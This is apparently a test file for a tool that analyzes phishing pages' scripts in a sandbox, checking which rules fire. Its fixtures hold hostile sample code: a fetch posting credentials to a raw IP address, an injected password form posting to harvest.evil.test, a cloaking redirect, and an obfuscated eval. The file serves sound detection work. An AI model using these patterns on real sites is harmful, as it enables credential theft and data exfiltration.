import { analyzeDynamic, runInstrumented, extractInlineScripts } from "../src/dynamic";

test("records JS redirect, exfil fetch, and injected credential form without executing them", () => {
  const html = `
    <html><body>
    <script>
      // cloaking redirect
      window.location.href = "https://bit.ly/landing";
      // exfil to a suspicious endpoint (raw IP) — the sketchy-destination pattern
      fetch("http://185.220.101.45/collect", { method: "POST", body: "creds" });
      // a benign off-site API call to an ordinary domain (must NOT read as exfil)
      fetch("https://api.partner-cdn.com/v1/telemetry", { method: "POST", body: "x" });
      // inject a credential form that posts off-origin
      document.write('<form action="https://harvest.evil.test/p" method="post"><input type="password" name="pw"></form>');
      // decode + eval an obfuscated blob
      var code = atob("YWxlcnQoMSk=");
      eval(code);
    </script>
    </body></html>`;

  const { report, findings } = analyzeDynamic(html, { url: "https://victim.example/login" });

  // Behavior recorded, nothing actually ran.
  expect(report.redirects).toContain("https://bit.ly/landing");
  expect(report.network.some((n) => n.kind === "fetch" && n.url === "http://185.220.101.45/collect")).toBe(true);
  expect(report.writes.some((w) => w.includes("harvest.evil.test"))).toBe(true);
  expect(report.evals.length).toBeGreaterThan(0);
  expect(report.decoded).toContain("alert(1)");

  const ruleIds = findings.map((f) => f.ruleId);
  // The suspicious (raw-IP) destination is exfil; the ordinary domain is just a note.
  expect(ruleIds).toContain("runtime_offsite_exfil");
  expect(ruleIds).toContain("runtime_offsite_request");
  expect(ruleIds).toContain("runtime_offsite_redirect");
  // The injected form is re-scanned by the static engine -> existing rule fires.
  expect(ruleIds).toContain("credential_form_posts_off_origin");
});

test("does not flag a benign same-origin script", () => {
  const html = `<script>
    document.getElementById("x");
    fetch("/api/me");
    window.location.href = "/dashboard";
  </script>`;
  const { findings } = analyzeDynamic(html, { url: "https://app.example/" });
  expect(findings.filter((f) => f.ruleId.startsWith("runtime_offsite"))).toHaveLength(0);
});

test("ignores external (src) and json scripts; only evaluates inline code", () => {
  const scripts = extractInlineScripts(`
    <script src="https://cdn.example/app.js"></script>
    <script type="application/json">{"a":1}</script>
    <script>var ok = 1;</script>`);
  expect(scripts).toEqual(["var ok = 1;"]);
});

test("evaluation is sandboxed: a throwing script is recorded, not propagated", () => {
  const report = runInstrumented(["throw new Error('boom'); fetch('https://evil.test/x')"], { url: "https://x.example/" });
  expect(report.errors.length).toBe(1);
});
